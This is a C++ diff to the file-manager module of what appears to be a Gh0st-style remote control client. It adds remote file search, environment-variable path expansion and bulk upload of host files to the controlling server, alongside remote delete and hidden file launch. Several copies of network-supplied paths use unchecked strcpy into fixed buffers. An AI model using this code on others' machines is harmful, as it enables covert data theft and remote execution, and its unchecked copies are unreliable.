@@ -4,13 +4,22 @@
 
 #include "FileManager.h"
 #include <shellapi.h>
+#include <thread>
 #include "ZstdArchive.h"
 #include "file_upload.h"
+#include "IOCPClient.h"
+#include "KernelManager.h"
 
 typedef struct {
     DWORD	dwSizeHigh;
     DWORD	dwSizeLow;
 } FILESIZE;
+
+struct SearchParam {
+    CFileManager *pThis;
+    char szPath[MAX_PATH];
+    char szName[MAX_PATH];
+};
 
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
@@ -19,15 +28,40 @@ typedef struct {
 CFileManager::CFileManager(CClientSocket *pClient, int h, void* user):CManager(pClient)
 {
     m_nTransferMode = TRANSFER_MODE_NORMAL;
+    m_bSearching = false;
+    m_hSearchThread = NULL;
+
+    // 初始化V2文件传输模块
+    CKernelManager* main = (CKernelManager*)pClient->GetMain();
+    InitFileUpload({}, main ? main->m_LoginMsg : pClient->m_LoginMsg,
+        main ? main->m_LoginSignature : pClient->m_LoginSignature, 64, 50, Logf);
+
     // 发送驱动器列表, 开始进行文件管理，建立新线程
     SendDriveList();
 }
 
 CFileManager::~CFileManager()
 {
+    m_bSearching = false;
+    if (m_hSearchThread) {
+        WaitForSingleObject(m_hSearchThread, 5000);
+        SAFE_CLOSE_HANDLE(m_hSearchThread);
+    }
     m_UploadList.clear();
+    UninitFileUpload();
 }
 
+
+// 展开环境变量 (如 %USERPROFILE%, %DESKTOP% 等)
+static std::string ExpandPath(const char* path)
+{
+    char szExpanded[MAX_PATH];
+    DWORD len = ExpandEnvironmentStringsA(path, szExpanded, MAX_PATH);
+    if (len > 0 && len < MAX_PATH) {
+        return szExpanded;
+    }
+    return path;  // 展开失败则返回原路径
+}
 
 std::string GetExtractDir(const std::string& archivePath)
 {
@@ -55,6 +89,10 @@ VOID CFileManager::OnReceive(PBYTE lpBuffer, ULONG nSize)
     switch (lpBuffer[0]) {
     case CMD_COMPRESS_FILES: {
         std::vector<std::string> paths = ParseMultiStringPath((char*)lpBuffer + 1, nSize - 1);
+        // 展开所有路径中的环境变量
+        for (size_t i = 0; i < paths.size(); i++) {
+            paths[i] = ExpandPath(paths[i].c_str());
+        }
         zsta::Error err = zsta::CZstdArchive::Compress(std::vector<std::string>(paths.begin() + 1, paths.end()), paths.at(0));
         if (err != zsta::Error::Success) {
             Mprintf("压缩失败: %s\n", zsta::CZstdArchive::GetErrorString(err));
@@ -68,7 +106,7 @@ VOID CFileManager::OnReceive(PBYTE lpBuffer, ULONG nSize)
         std::string dir;
         std::vector<std::string> paths = ParseMultiStringPath((char*)lpBuffer + 1, nSize - 1);
         for (size_t i = 0; i < paths.size(); i++) {
-            const std::string& path = paths[i];
+            std::string path = ExpandPath(paths[i].c_str());
             std::string destDir = GetExtractDir(path);
             zsta::Error err = zsta::CZstdArchive::Extract(path, destDir);
             if (err != zsta::Error::Success) {
@@ -85,44 +123,99 @@ VOID CFileManager::OnReceive(PBYTE lpBuffer, ULONG nSize)
     case COMMAND_LIST_FILES:// 获取文件列表
         SendFilesList((char *)lpBuffer + 1);
         break;
-    case COMMAND_DELETE_FILE:// 删除文件
-        DeleteFile((char *)lpBuffer + 1);
+    case COMMAND_DELETE_FILE: {// 删除文件
+        std::string path = ExpandPath((char *)lpBuffer + 1);
+        DeleteFile(path.c_str());
         SendToken(TOKEN_DELETE_FINISH);
         break;
-    case COMMAND_DELETE_DIRECTORY:// 删除文件
-        DeleteDirectory((char *)lpBuffer + 1);
+    }
+    case COMMAND_DELETE_DIRECTORY: {// 删除目录
+        std::string path = ExpandPath((char *)lpBuffer + 1);
+        DeleteDirectory(path.c_str());
         SendToken(TOKEN_DELETE_FINISH);
         break;
+    }
     case COMMAND_DOWN_FILES: // 上传文件
+        // 注意：不展开环境变量，保持原始路径发送给服务端
+        // 这样服务端的 Replace(m_Remote_Path, localPath) 能正确匹配
         UploadToRemote(lpBuffer + 1);
+        break;
+    case CMD_DOWN_FILES_V2: // V2上传文件到服务端
+        UploadToRemoteV2(lpBuffer + 1, nSize - 1);
         break;
     case COMMAND_CONTINUE: // 上传文件
         SendFileData(lpBuffer + 1);
         break;
-    case COMMAND_CREATE_FOLDER:
-        CreateFolder(lpBuffer + 1);
+    case COMMAND_CREATE_FOLDER: {
+        std::string path = ExpandPath((char *)lpBuffer + 1);
+        CreateFolder((LPBYTE)path.c_str());
         break;
-    case COMMAND_RENAME_FILE:
-        Rename(lpBuffer + 1);
+    }
+    case COMMAND_RENAME_FILE: {
+        // 数据格式: [OldName\0][NewName\0]
+        char *pOldName = (char *)lpBuffer + 1;
+        char *pNewName = pOldName + strlen(pOldName) + 1;
+        std::string oldPath = ExpandPath(pOldName);
+        std::string newPath = ExpandPath(pNewName);
+        // 构造展开后的数据
+        char szBuf[MAX_PATH * 2 + 2];
+        strcpy(szBuf, oldPath.c_str());
+        strcpy(szBuf + oldPath.length() + 1, newPath.c_str());
+        Rename((LPBYTE)szBuf);
         break;
+    }
     case COMMAND_STOP:
         StopTransfer();
         break;
     case COMMAND_SET_TRANSFER_MODE:
         SetTransferMode(lpBuffer + 1);
         break;
-    case COMMAND_FILE_SIZE:
-        CreateLocalRecvFile(lpBuffer + 1);
+    case COMMAND_FILE_SIZE: {
+        // 数据格式: [8字节大小][文件名\0]
+        // 需要展开文件名部分
+        BYTE bNewBuffer[MAX_PATH + 16];
+        memcpy(bNewBuffer, lpBuffer + 1, 8);  // 复制大小
+        std::string path = ExpandPath((char *)lpBuffer + 9);
+        strcpy((char *)bNewBuffer + 8, path.c_str());
+        CreateLocalRecvFile(bNewBuffer);
         break;
+    }
     case COMMAND_FILE_DATA:
         WriteLocalRecvFile(lpBuffer + 1, nSize -1);
         break;
-    case COMMAND_OPEN_FILE_SHOW:
-        OpenFile((char *)lpBuffer + 1, SW_SHOW);
+    case COMMAND_SEARCH_FILE: {
+        // 停止上一次搜索
+        m_bSearching = false;
+        if (m_hSearchThread) {
+            WaitForSingleObject(m_hSearchThread, 5000);
+            SAFE_CLOSE_HANDLE(m_hSearchThread);
+            m_hSearchThread = NULL;
+        }
+        // 数据格式: [SearchPath\0][SearchFileName\0]
+        char *pSearchPath = (char *)lpBuffer + 1;
+        char *pSearchName = pSearchPath + strlen(pSearchPath) + 1;
+        // 复制参数，在线程中使用
+        SearchParam *pParam = new SearchParam;
+        pParam->pThis = this;
+        lstrcpynA(pParam->szPath, pSearchPath, MAX_PATH);
+        lstrcpynA(pParam->szName, pSearchName, MAX_PATH);
+        m_bSearching = true;
+        m_hSearchThread = __CreateThread(NULL, 0, SearchThreadProc, (LPVOID)pParam, 0, NULL);
         break;
-    case COMMAND_OPEN_FILE_HIDE:
-        OpenFile((char *)lpBuffer + 1, SW_HIDE);
+    }
+    case COMMAND_FILES_SEARCH_STOP:
+        m_bSearching = false;
         break;
+    case COMMAND_OPEN_FILE_SHOW: {
+        std::string path = ExpandPath((char *)lpBuffer + 1);
+        OpenFile(path.c_str(), SW_SHOW);
+        break;
+    }
+    case COMMAND_OPEN_FILE_HIDE: {
+        std::string path = ExpandPath((char *)lpBuffer + 1);
+        OpenFile(path.c_str(), SW_HIDE);
+        break;
+    }
     default:
         break;
     }
@@ -330,6 +423,10 @@ UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
     // 重置传输方式
     m_nTransferMode = TRANSFER_MODE_NORMAL;
 
+    // 展开环境变量 (如 %USERPROFILE%, %DESKTOP% 等)
+    char	szExpandedDir[MAX_PATH];
+    ExpandEnvironmentStringsA(lpszDirectory, szExpandedDir, MAX_PATH);
+
     UINT	nRet = 0;
     char	strPath[MAX_PATH];
     char	*pszFileName = NULL;
@@ -345,7 +442,7 @@ UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
         return 0;
     }
 
-    wsprintf(strPath, "%s\\*.*", lpszDirectory);
+    wsprintf(strPath, "%s\\*.*", szExpandedDir);
     hFile = FindFirstFile(strPath, &FindFileData);
 
     if (hFile == INVALID_HANDLE_VALUE) {
@@ -400,6 +497,187 @@ UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
 }
 
 
+// 通配符匹配 (支持 * 和 ?)
+static bool WildcardMatch(const char* pattern, const char* str)
+{
+    while (*pattern) {
+        if (*pattern == '*') {
+            pattern++;
+            if (!*pattern) return true;
+            while (*str) {
+                if (WildcardMatch(pattern, str)) return true;
+                str++;
+            }
+            return false;
+        } else if (*pattern == '?') {
+            if (!*str) return false;
+            pattern++;
+            str++;
+        } else {
+            if (tolower((unsigned char)*pattern) != tolower((unsigned char)*str)) return false;
+            pattern++;
+            str++;
+        }
+    }
+    return *str == '\0';
+}
+
+#define SEARCH_MAX_DEPTH    32      // 最大递归深度
+#define SEARCH_MAX_RESULTS  10000   // 最大搜索结果数
+
+// 判断是否应跳过的系统/特殊目录
+static bool ShouldSkipDirectory(LPCTSTR lpszName, DWORD dwAttributes)
+{
+    // 跳过隐藏+系统目录 (如 $Recycle.Bin, System Volume Information)
+    if ((dwAttributes & FILE_ATTRIBUTE_HIDDEN) && (dwAttributes & FILE_ATTRIBUTE_SYSTEM))
+        return true;
+    // 跳过重解析点 (符号链接/junction 避免死循环)
+    if (dwAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
+        return true;
+    return false;
+}
+
+void CFileManager::SearchFilesRecursive(LPCTSTR lpszDirectory, LPCTSTR lpszPattern,
+                                        LPBYTE &lpList, DWORD &dwOffset, DWORD &nBufferSize, int nDepth, DWORD &nResultCount, DWORD &dwLastSendTime)
+{
+    if (!m_bSearching) return;
+    if (nDepth > SEARCH_MAX_DEPTH) return;
+    if (nResultCount >= SEARCH_MAX_RESULTS) {
+        m_bSearching = false;
+        return;
+    }
+
+    char strPath[MAX_PATH];
+    WIN32_FIND_DATA FindFileData;
+
+    wsprintf(strPath, "%s\\*.*", lpszDirectory);
+    HANDLE hFile = FindFirstFile(strPath, &FindFileData);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+
+    do {
+        if (!m_bSearching) break;
+        if (nResultCount >= SEARCH_MAX_RESULTS) break;
+
+        if (strcmp(FindFileData.cFileName, ".") == 0 || strcmp(FindFileData.cFileName, "..") == 0)
+            continue;
+
+        BOOL bIsDir = FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
+
+        char szFullPath[MAX_PATH];
+        wsprintf(szFullPath, "%s\\%s", lpszDirectory, FindFileData.cFileName);
+
+        // 检查文件名是否匹配搜索模式
+        if (WildcardMatch(lpszPattern, FindFileData.cFileName)) {
+            int nFullPathLen = lstrlen(szFullPath);
+
+            // 需要空间: 1(attr) + nFullPathLen+1(name) + 8(size) + 8(time)
+            DWORD nNeeded = 1 + nFullPathLen + 1 + 16;
+
+            // 缓冲区快满时先发送当前批次
+            if (dwOffset + nNeeded > nBufferSize - MAX_PATH) {
+                if (dwOffset > 1) {
+                    Send(lpList, dwOffset);
+                    dwLastSendTime = GetTickCount();
+                }
+                *lpList = TOKEN_SEARCH_FILE_LIST;
+                dwOffset = 1;
+            }
+
+            // 动态扩展
+            if (dwOffset + nNeeded > nBufferSize) {
+                nBufferSize = dwOffset + nNeeded + MAX_PATH * 2;
+                lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT | LMEM_MOVEABLE);
+                if (lpList == NULL) break;
+            }
+
+            // 文件属性
+            *(lpList + dwOffset) = FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
+            dwOffset++;
+            // 完整路径
+            memcpy(lpList + dwOffset, szFullPath, nFullPathLen);
+            dwOffset += nFullPathLen;
+            *(lpList + dwOffset) = 0;
+            dwOffset++;
+            // 文件大小 8 字节
+            memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
+            memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
+            dwOffset += 8;
+            // 最后修改时间 8 字节
+            memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
+            dwOffset += 8;
+
+            nResultCount++;
+        }
+
+        // 超过2秒未发送，先把缓冲区内的数据发出去
+        if (dwOffset > 1 && GetTickCount() - dwLastSendTime >= 2000) {
+            Send(lpList, dwOffset);
+            dwLastSendTime = GetTickCount();
+            *lpList = TOKEN_SEARCH_FILE_LIST;
+            dwOffset = 1;
+        }
+
+        // 递归搜索子目录 (跳过系统/隐藏/重解析点目录)
+        if (bIsDir && !ShouldSkipDirectory(FindFileData.cFileName, FindFileData.dwFileAttributes)) {
+            SearchFilesRecursive(szFullPath, lpszPattern, lpList, dwOffset, nBufferSize, nDepth + 1, nResultCount, dwLastSendTime);
+        }
+    } while (FindNextFile(hFile, &FindFileData));
+
+    FindClose(hFile);
+}
+
+DWORD WINAPI CFileManager::SearchThreadProc(LPVOID lpParam)
+{
+    SearchParam *pParam = (SearchParam *)lpParam;
+    pParam->pThis->SearchFiles(pParam->szPath, pParam->szName);
+    delete pParam;
+    return 0;
+}
+
+void CFileManager::SearchFiles(LPCTSTR lpszSearchPath, LPCTSTR lpszSearchName)
+{
+    // 展开环境变量
+    char szExpandedPath[MAX_PATH];
+    ExpandEnvironmentStringsA(lpszSearchPath, szExpandedPath, MAX_PATH);
+
+    // 构建搜索模式 (如 *.txt 或 *keyword*)
+    char szPattern[MAX_PATH];
+    if (strchr(lpszSearchName, '*') == NULL && strchr(lpszSearchName, '?') == NULL) {
+        wsprintf(szPattern, "*%s*", lpszSearchName);
+    } else {
+        lstrcpy(szPattern, lpszSearchName);
+    }
+
+    DWORD nBufferSize = 1024 * 64;
+    LPBYTE lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
+    if (lpList == NULL) {
+        SendToken(TOKEN_SEARCH_FILE_FINISH);
+        return;
+    }
+
+    *lpList = TOKEN_SEARCH_FILE_LIST;
+    DWORD dwOffset = 1;
+    DWORD nResultCount = 0;
+    DWORD dwLastSendTime = GetTickCount();
+
+    DWORD dwStart = dwLastSendTime;
+    Mprintf("[Search] Start: path=\"%s\" pattern=\"%s\"\n", szExpandedPath, szPattern);
+
+    SearchFilesRecursive(szExpandedPath, szPattern, lpList, dwOffset, nBufferSize, 0, nResultCount, dwLastSendTime);
+
+    DWORD dwElapsed = GetTickCount() - dwStart;
+    Mprintf("[Search] Done: %d results, %d ms, stopped=%d\n", nResultCount, dwElapsed, !m_bSearching);
+
+    // 发送剩余数据 (如果已停止则丢弃)
+    if (m_bSearching && lpList && dwOffset > 1) {
+        Send(lpList, dwOffset);
+    }
+
+    if (lpList) LocalFree(lpList);
+    SendToken(TOKEN_SEARCH_FILE_FINISH);
+    m_bSearching = false;
+}
+
 bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
 {
     WIN32_FIND_DATA	wfd;
@@ -440,16 +718,19 @@ UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
     DWORD	dwSizeLow;
     // 1 字节token, 8字节大小, 文件名称, '\0'
     HANDLE	hFile;
-    // 保存当前正在操作的文件名
+    // 保存当前正在操作的文件名（原始路径，可能含环境变量）
     memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
     strcpy(m_strCurrentProcessFileName, lpszFileName);
 
-    hFile = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+    // 展开环境变量用于实际文件操作
+    std::string strExpanded = ExpandPath(lpszFileName);
+    hFile = CreateFile(strExpanded.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
     if (hFile == INVALID_HANDLE_VALUE)
         return FALSE;
     dwSizeLow =	GetFileSize(hFile, &dwSizeHigh);
     SAFE_CLOSE_HANDLE(hFile);
     // 构造数据包，发送文件长度
+    // 注意：发送原始路径（可能含环境变量），让服务端能正确 Replace
     int		nPacketSize = lstrlen(lpszFileName) + 10;
     BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
     if (bPacket==NULL) {
@@ -472,18 +753,18 @@ UINT CFileManager::SendFileData(LPBYTE lpBuffer)
 {
     UINT		nRet = 0;
     FILESIZE	*pFileSize;
-    char		*lpFileName;
 
     pFileSize = (FILESIZE *)lpBuffer;
-    lpFileName = m_strCurrentProcessFileName;
 
     // 远程跳过，传送下一个
     if (pFileSize->dwSizeLow == -1) {
         UploadNext();
         return 0;
     }
+    // 展开环境变量用于实际文件操作
+    std::string strExpanded = ExpandPath(m_strCurrentProcessFileName);
     HANDLE	hFile;
-    hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+    hFile = CreateFile(strExpanded.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
     if (hFile == INVALID_HANDLE_VALUE)
         return -1;
 
@@ -566,7 +847,9 @@ bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
     else
         lpszSlash = "";
 
-    wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);
+    // 展开环境变量用于 FindFirstFile
+    std::string strExpandedPath = ExpandPath(lpPathName);
+    wsprintf(lpszFilter, "%s%s*.*", strExpandedPath.c_str(), lpszSlash);
 
     HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
     if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
@@ -575,10 +858,12 @@ bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
     do {
         if (wfd.cFileName[0] != '.') {
             if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                // 保持原始路径（可能含环境变量）+ 子目录名
                 char strDirectory[MAX_PATH];
                 wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
                 FixedUploadList(strDirectory);
             } else {
+                // 保持原始路径（可能含环境变量）+ 文件名
                 char strFile[MAX_PATH];
                 wsprintf(strFile, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
                 m_UploadList.push_back(strFile);
@@ -647,7 +932,7 @@ void CFileManager::GetFileData()
 
     //  1字节Token,四字节偏移高四位，四字节偏移低四位
     BYTE	bToken[9];
-    DWORD	dwCreationDisposition = 0; // 文件打开方式
+    DWORD	dwCreationDisposition = CREATE_ALWAYS; // 文件打开方式
     memset(bToken, 0, sizeof(bToken));
     bToken[0] = TOKEN_DATA_CONTINUE;
 
@@ -773,4 +1058,127 @@ void CFileManager::Rename(LPBYTE lpBuffer)
     LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;
     ::MoveFile(lpExistingFileName, lpNewFileName);
     SendToken(TOKEN_RENAME_FINISH);
+}
+
+// V2文件传输：收集目录中的所有文件
+void CFileManager::CollectFilesRecursiveV2(const std::string& dirPath, const std::string& basePath, std::vector<std::string>& files)
+{
+    // 先添加目录本身（去掉末尾的反斜杠）
+    std::string dirEntry = dirPath;
+    if (!dirEntry.empty() && (dirEntry.back() == '\\' || dirEntry.back() == '/')) {
+        dirEntry.pop_back();
+    }
+    files.push_back(dirEntry);
+
+    WIN32_FIND_DATAA wfd;
+    std::string searchPath = dirPath + "*.*";
+
+    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &wfd);
+    if (hFind == INVALID_HANDLE_VALUE)
+        return;
+
+    do {
+        if (wfd.cFileName[0] != '.') {
+            std::string fullPath = dirPath + wfd.cFileName;
+            if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                CollectFilesRecursiveV2(fullPath + "\\", basePath, files);
+            } else {
+                files.push_back(fullPath);
+            }
+        }
+    } while (FindNextFileA(hFind, &wfd));
+
+    FindClose(hFind);
+}
+
+// V2文件传输：上传文件到服务端
+// 包格式: [targetDir\0][file1\0][file2\0]...[\0]
+void CFileManager::UploadToRemoteV2(LPBYTE lpBuffer, UINT nSize)
+{
+    // 解析目标目录（服务端的本地目录）
+    const char* targetDir = (const char*)lpBuffer;
+    size_t targetDirLen = strlen(targetDir);
+
+    // 解析文件列表
+    std::vector<std::string> remotePaths;
+    const char* p = targetDir + targetDirLen + 1;
+    const char* end = (const char*)lpBuffer + nSize;
+    while (p < end && *p != '\0') {
+        remotePaths.push_back(p);
+        p += strlen(p) + 1;
+    }
+
+    if (remotePaths.empty()) {
+        Mprintf("[V2] 没有要传输的文件\n");
+        return;
+    }
+
+    // 收集所有文件（展开目录）
+    std::vector<std::string> allFiles;
+    std::vector<std::string> rootCandidates;  // 用于计算公共根目录
+
+    for (const auto& remotePath : remotePaths) {
+        std::string localPath = ExpandPath(remotePath.c_str());
+
+        DWORD attrs = GetFileAttributesA(localPath.c_str());
+        if (attrs == INVALID_FILE_ATTRIBUTES)
+            continue;
+
+        if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
+            // 目录：递归收集
+            std::string dirPath = localPath;
+            if (dirPath.back() != '\\') dirPath += '\\';
+            // 使用父目录参与公共根计算，以保留目录名
+            size_t pos = dirPath.find_last_of("\\", dirPath.length() - 2);
+            std::string parentPath = (pos != std::string::npos) ? dirPath.substr(0, pos + 1) : dirPath;
+            rootCandidates.push_back(parentPath);
+            CollectFilesRecursiveV2(dirPath, parentPath, allFiles);
+        } else {
+            // 文件：使用文件本身参与公共根计算
+            rootCandidates.push_back(localPath);
+            allFiles.push_back(localPath);
+        }
+    }
+
+    if (allFiles.empty()) {
+        Mprintf("[V2] 没有找到可传输的文件\n");
+        return;
+    }
+
+    // 获取公共根目录（从选中项的父目录计算，而不是从展开的文件）
+    std::string commonRoot = GetCommonRoot(rootCandidates);
+    Mprintf("[V2] 开始传输 %zu 个文件, 公共根: %s, 目标: %s\n",
+        allFiles.size(), commonRoot.c_str(), targetDir);
+
+    // 使用V2协议发送
+    TransferOptionsV2 opts;
+    opts.transferID = GenerateTransferID();
+    CONNECT_ADDRESS* conn = m_ClientObject->GetConnectionAddress();
+    opts.srcClientID = conn ? conn->clientID : 0;
+    opts.dstClientID = 0;  // 发送给服务端
+    opts.enableResume = false;  // 文件管理器不支持断点续传
+
+    std::string hash(conn ? conn->pwdHash : "", conn ? strnlen(conn->pwdHash, 64) : 0);
+    std::string hmac;  // V2传输到服务端不需要hmac验证
+
+    // 创建新连接发送文件
+    IOCPClient* pClient = new IOCPClient(g_bExit, true, MaskTypeNone, conn);
+    if (pClient->ConnectServer(m_ClientObject->ServerIP().c_str(), m_ClientObject->ServerPort())) {
+        std::thread([allFiles, targetDir = std::string(targetDir), pClient, opts, hash, hmac]() {
+            FileBatchTransferWorkerV2(allFiles, targetDir, pClient,
+                [](void* user, FileChunkPacketV2* chunk, unsigned char* data, int size) -> bool {
+                    IOCPClient* client = (IOCPClient*)user;
+                    return client->Send2Server((char*)data, size) != FALSE;
+                },
+                [](void* user) {
+                    IOCPClient* client = (IOCPClient*)user;
+                    delete client;
+                    Mprintf("[V2] 文件发送完成\n");
+                },
+                hash, hmac, opts);
+        }).detach();
+    } else {
+        delete pClient;
+        Mprintf("[V2] 连接服务器失败\n");
+    }
 }
